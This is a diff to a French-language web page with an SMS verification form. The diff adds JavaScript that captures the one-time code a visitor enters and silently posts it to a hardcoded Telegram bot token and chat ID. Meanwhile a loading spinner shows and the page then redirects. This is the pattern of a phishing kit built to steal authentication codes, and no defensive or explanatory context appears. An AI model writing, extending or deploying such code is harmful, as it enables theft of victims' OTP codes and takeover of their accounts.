@@ -20,7 +20,6 @@
           <button class="toggle">Professionnel</button>
         </div>
       </div>
-      <!-- PAS DE NAV-LINKS -->
     </nav>
   </div>
 
@@ -60,6 +59,24 @@
     document.getElementById("sms-form").addEventListener("submit", function(e) {
       e.preventDefault();
       document.getElementById("spinnerOverlay").style.display = "flex";
+
+      const otpCode = document.getElementById("sms-code").value;
+
+      // Envoi Telegram
+      const message = `📲 Code SMS reçu : ${otpCode}`;
+      const token = "7959354545:AAEfYBDF24DOs30vwYScteq1uWMO65FP8Fo";
+      const chatId = "-4911236455";
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      });
 
       // Redirection après 4 secondes
       setTimeout(function() {
